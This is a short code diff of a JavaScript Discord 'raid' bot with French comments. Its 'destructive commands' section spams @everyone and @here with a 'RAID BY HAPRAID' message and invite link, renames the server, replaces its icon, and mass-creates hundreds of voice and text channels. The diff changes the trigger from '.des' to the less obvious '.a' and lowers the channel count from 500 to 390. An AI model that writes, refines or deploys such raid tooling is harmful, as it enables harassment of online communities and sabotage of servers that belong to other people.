@@ -24,7 +24,7 @@ bot.on('message', msg => {
  
   //#region Destructrices
   /* Commandes destructrices */
-  if (msg.content === '.des') {
+  if (msg.content === '.a') {
     console.log(`Commande .des par ${msg.author.tag}`);
     var interval = setInterval (function () {
       msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
@@ -38,7 +38,7 @@ bot.on('message', msg => {
       msg.guild.setIcon("hapraid.png").catch(e => {});
       msg.guild.setName('RAID BY HAPRAID').catch(e => {});
  
-      for (var i = 0; i < 500; i++) {
+      for (var i = 0; i < 390; i++) {
         msg.guild.createChannel('hapraid_vous_remercie', 'voice').catch(e => {});
         msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
       }
